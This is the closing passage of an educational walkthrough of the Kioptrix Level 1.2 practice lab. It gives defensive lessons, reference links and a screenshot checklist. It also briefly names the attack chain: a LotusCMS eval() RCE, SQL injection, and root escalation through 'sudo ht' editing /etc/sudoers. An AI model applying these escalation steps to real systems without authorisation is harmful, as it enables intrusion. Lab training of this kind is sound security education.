| Dangerous sudo rule | N/A (misconfiguration) | `/usr/local/bin/ht` run via sudo | local | `loneferret` → root | Root text editor can edit `/etc/sudoers`. |

> **How to read it:** Multiple independent flaws — any one of several chains reaches `root`. That is why the author says there is "more than one way."

## 6. Defensive lessons (blue team)

- **Patch your CMS and plugins.** The LotusCMS `eval()` bug is a known, dated RCE. Unknown/EOL CMS software is a standing invitation.
- **Never `eval()` untrusted input, never include user-controlled paths.** Both are direct code-execution primitives. Validate against an allow-list and resolve real paths server-side.
- **Use parameterized queries everywhere.** This eliminates both the login SQLi and the gallery union injection.
- **Do not store secrets in config files served by the web server.** Scope file permissions, keep credentials in a secrets manager, and never grant the web DB user `root`.
- **Hash passwords properly.** Use a slow, salted algorithm (bcrypt/scrypt/Argon2). Unsalted MD5 is effectively plaintext to an attacker.
- **Eliminate password reuse and enforce password policy.** One cracked DB hash should not equal SSH access.
- **Audit sudo rules ruthlessly.** Granting `sudo` on an *editor* or any program that can spawn a shell or write files is equivalent to granting root. Restrict sudo to specific, non-interactive commands.
- **Remove hidden functionality.** A commented-out `/gadmin` link is not access control — the endpoint still works.

## 7. References

Real community writeups consulted during research (they document these paths):

- [VulnHub – Kioptrix: Level 1.2 Walkthrough — steflan-security](https://steflan-security.com/vulnhub-kioptrix-level-1-2-walkthrough/)
- [Kioptrix: Level 1.2 (#3) Walkthrough — rootshellz](https://blog.rootshellz.com/kioptrix-walkthrough-3/)
- [Kioptrix Level 1.2 (#3) Walkthrough — doyler.net](https://www.doyler.net/security-not-included/kioptrix-level-1-2-3-walkthrough)
- [VulnHub – Kioptrix: Level 3 (1.2) — davidvarghese](https://blog.davidvarghese.com/posts/vulnhub-kioptrix-level-3/)
- [VulnHub Write-Up Kioptrix Level 3 — isroot.nl](https://isroot.nl/2018/10/03/vulnhub-write-up-kioptrix-level-3/)
- [VulnHub Entry — Kioptrix: Level 1.2 (#3)](https://vulnhub.com/entry/kioptrix-level-12-3,24/)

## 8. Screenshot checklist

- [ ] `images/01-recon-netdiscover.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap + directory scan (Apache/PHP, `/phpmyadmin`, `/gallery`)
- [ ] `images/03-foothold.png` — LotusCMS RCE (or SQLi/LFI) leading to a `www-data` shell
- [ ] `images/04-root-escalation.png` — `sudo -l`, `sudo ht` editing `/etc/sudoers`, and `sudo su` → root
- [ ] `images/05-proof.png` — `/root/Congrats.txt` or root `whoami`

> **How to read it:** Store screenshots in `labs/kioptrix-level-12-3/images/` and reference them with the relative paths shown.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
